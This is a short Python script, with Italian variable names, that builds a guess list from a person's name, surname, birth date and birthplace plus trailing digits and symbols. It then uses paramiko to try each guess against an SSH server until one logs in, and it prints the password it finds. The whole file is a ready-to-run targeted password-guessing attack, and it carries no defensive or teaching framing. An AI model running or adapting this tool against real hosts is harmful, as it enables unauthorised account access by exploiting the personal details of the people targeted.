import itertools
import paramiko

# Function to generate possible passwords
def generate_passwords(nome, cognome, data_di_nascita, luogo_di_nascita=""):
    possible_passwords = []

    possible_passwords.extend([nome.lower(), cognome.lower()])
    possible_passwords.extend([nome.lower() + cognome.lower(), cognome.lower() + nome.lower()])

    possible_passwords.extend([nome.lower() + data_di_nascita, cognome.lower() + data_di_nascita])
    possible_passwords.extend([nome.lower() + cognome.lower() + data_di_nascita, cognome.lower() + nome.lower() + data_di_nascita])

    if luogo_di_nascita:
        possible_passwords.extend([nome.lower() + cognome.lower() + luogo_di_nascita, cognome.lower() + nome.lower() + luogo_di_nascita])

   
    variants = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '@', '#', '$', '%']
    possible_passwords.extend([password + variant for password, variant in itertools.product(possible_passwords, variants)])

    return possible_passwords

# Function to attempt  connection with generated passwords
def try_ssh_connections(hostname, port, username, possible_passwords):
    for password in possible_passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname, port=port, username=username, password=password)
            print(f"Connection successful with password: {password}")
            ssh.close()
            return password  
        except paramiko.AuthenticationException:
            print(f"Failed connection attempt with password: {password}")

#
nome = "nome"
cognome = "Cognome"
data_di_nascita = "data_nascita"
luogo_di_nascita = "luogo di nascita"
hostname = "hostname" 
port = 22  # SSH port
username = "alice"  # Insert the SSH username

# Generation of possible passwords
possible_passwords = generate_passwords(nome, cognome, data_di_nascita, luogo_di_nascita)

# Attempt SSH connections with generated passwords
found_password = try_ssh_connections(hostname, port, username, possible_passwords)


if found_password:
    print(f"Found password: {found_password}")
else:
    print("Password not found.")
